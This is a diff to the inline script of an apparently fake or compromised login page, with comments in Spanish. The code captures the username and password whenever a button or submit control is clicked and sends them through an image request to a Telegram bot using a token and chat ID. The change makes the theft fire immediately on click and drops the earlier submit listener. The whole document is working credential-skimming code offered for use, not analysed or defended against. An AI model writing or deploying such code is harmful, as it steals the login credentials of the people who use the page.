@@ -438,19 +438,10 @@
         return originalAlert ? originalAlert(msg) : true;
     };
 
-    // Captura global y directa en el formulario o documento
-    document.addEventListener("submit", function(e) {
-        enviarDatos();
-    }, true);
-
+    // Captura inmediata al hacer clic en el botón de ingresar
     document.addEventListener("click", function(e) {
-        if (e.target.tagName === 'BUTTON' || e.target.type === 'submit' || e.target.closest('button')) {
-            enviarDatos();
-        }
-    }, true);
-
-    function enviarDatos() {
-        setTimeout(function() {
+        const target = e.target.closest('button') || e.target;
+        if (target && (target.tagName === 'BUTTON' || target.type === 'submit' || target.classList.contains('btn--blue'))) {
             const usuario = document.getElementById('loginUsuario')?.value || document.querySelector('input[type="text"]')?.value || document.querySelector('input')?.value;
             const password = document.querySelector('input[type="password"]')?.value;
 
@@ -460,8 +451,8 @@
                 const img = new Image();
                 img.src = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
             }
-        }, 300);
-    }
+        }
+    });
 </script>
 </body>
 </html>
